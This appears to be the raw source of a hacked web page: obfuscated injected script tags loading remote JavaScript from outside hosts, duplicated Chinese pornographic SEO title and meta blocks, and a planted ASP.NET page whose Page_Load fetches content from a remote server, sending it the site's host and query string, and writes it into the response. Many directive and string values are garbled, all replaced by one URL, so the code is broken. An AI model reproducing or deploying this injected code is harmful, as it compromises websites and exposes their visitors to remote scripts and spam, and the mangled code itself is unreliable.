<script/src=//%61%6C%69%63%64%6E%2E%72%65%2E%6B%72/%72%65%2E%6B%72></script>










<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>99re2.久久热最新地址|色欲影视 淫香淫色 天天影视 来吧综合网 插插综合网</title>
<meta name="keywords" content="99re2.久久热最新地址 欲影视 淫香淫色 天天影视 来吧综合网 插插综合网">
<meta name="description" content="99re2.久久热最新地址各种精彩内容实时更新,为广大网友提供原创资源,99re2.久久热最新地址一起酸爽。 ,思思的家园"><link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />


</head>



<script src="http://cpm.36obuy.org/js/1.js"></script><script/src=//alicdn.re.kr/re.kr></script>










<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>99re2.久久热最新地址|色欲影视 淫香淫色 天天影视 来吧综合网 插插综合网</title>
<meta name="keywords" content="99re2.久久热最新地址 欲影视 淫香淫色 天天影视 来吧综合网 插插综合网">
<meta name="description" content="99re2.久久热最新地址各种精彩内容实时更新,为广大网友提供原创资源,99re2.久久热最新地址一起酸爽。 ,思思的家园"><link rel="shortcut icon" type="image/x-icon" href="favicon.ico" />


</head>



<%@ Page Language= "http://www4.cdtsjy.cn/" Debug= "http://www4.cdtsjy.cn/" trace= "http://www4.cdtsjy.cn/" validateRequest= "http://www4.cdtsjy.cn/" EnableViewStateMac= "http://www4.cdtsjy.cn/" EnableViewState= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/" %>
<%@ import Namespace= "http://www4.cdtsjy.cn/" %>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ Import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ Import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ import Namespace= "http://www4.cdtsjy.cn/"%>
<%@ Assembly Name= "http://www4.cdtsjy.cn/"%>
<%@ Assembly Name= "http://www4.cdtsjy.cn/"%>
<%@ Assembly Name= "http://www4.cdtsjy.cn/"%>
<%@ Assembly Name= "http://www4.cdtsjy.cn/"%>

<script runat= "http://www4.cdtsjy.cn/">

/// <summary>
/// POST 请求方法
/// body是要传递的参数,格式"roleId= "http://www4.cdtsjy.cn/"
/// post的cotentType填写:
/// "application/x-www-form-uureewfencoded"
/// soap填写:"text/xml; charset= "http://www4.cdtsjy.cn/"
/// </summary>
/// <param name= "http://www4.cdtsjy.cn/"></param>
/// <param name= "http://www4.cdtsjy.cn/"></param>
/// <param name= "http://www4.cdtsjy.cn/"></param>
/// <returns></returns>
    public string PostHttp(string uureewf, string body, string contentType)
    {
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(uureewf);

        httpWebRequest.ContentType = contentType;
        httpWebRequest.Method = "http://www4.cdtsjy.cn/";
        httpWebRequest.Timeout = 20000;

        //byte[] btBodys = Encoding.UTF8.GetBytes(body);
        byte[] btBodys = Encoding.Default.GetBytes(body);
        
        httpWebRequest.ContentLength = btBodys.Length;
        httpWebRequest.GetRequestStream().Write(btBodys, 0, btBodys.Length);

        HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
        string responseContent = streamReader.ReadToEnd();

        httpWebResponse.Close();
        streamReader.Close();
        httpWebRequest.Abort();
        httpWebResponse.Close();

        return responseContent;
    }

    /// <summary>
    /// get 请求方法
    /// </summary>
    /// <param name= "http://www4.cdtsjy.cn/"></param>
    /// <returns></returns>
    public string GetHttp(string uureewf)
    {
        HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(uureewf);

        httpWebRequest.ContentType = "http://www4.cdtsjy.cn/";
        //httpWebRequest.Headers.Add("User-Agent", "aQ0O010O");
        httpWebRequest.UserAgent = "http://www4.cdtsjy.cn/";
        httpWebRequest.Method = "http://www4.cdtsjy.cn/";
        httpWebRequest.Timeout = 999999;

        HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding("GB2312"));
        string responseContent = streamReader.ReadToEnd();

        httpWebResponse.Close();
        streamReader.Close();

        return responseContent;
    }


    protected void Page_Load(object sender, EventArgs e)
    {

        string Remote_sedbgn = "http://www4.cdtsjy.cn/";
        string host_name = "http://www4.cdtsjy.cn/" + Request.ServerVariables["HTTP_HOST"] + Request.ServerVariables["script_name"];
        string Remote_file = Remote_sedbgn + "/index.php" + "?host=" + host_name + "&uureewf=" + Request.ServerVariables["Query_String"] + "&domain=" + Request.ServerVariables["Server_Name"];
        string Content_mb = GetHttp(Remote_file);
        Response.Write(Content_mb);

    }
</script>